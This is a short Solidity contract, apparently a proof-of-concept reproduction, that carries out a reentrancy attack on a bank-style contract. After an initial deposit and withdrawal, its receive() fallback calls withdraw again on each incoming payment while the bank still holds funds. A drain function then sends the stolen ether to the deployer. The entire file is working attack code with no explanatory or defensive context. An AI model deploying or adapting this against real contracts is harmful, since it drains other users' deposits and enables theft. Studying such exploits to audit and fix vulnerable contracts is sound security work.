interface IBankInterface {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    IBankInterface private bank;
    address private exploitInitiator;

    constructor(address _bank) {
        bank = IBankInterface(_bank);
        exploitInitiator = msg.sender;
    }

    function fundBank() external payable {
        require(msg.value > 0);
        bank.deposit{value: msg.value}();
    }

    function executeAttack(uint amount) external {
        require(msg.sender == exploitInitiator);
        bank.withdraw(amount);
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw(msg.value);
        }
    }

    function drain() external {
        require(msg.sender == exploitInitiator);
        payable(exploitInitiator).transfer(address(this).balance);
    }
}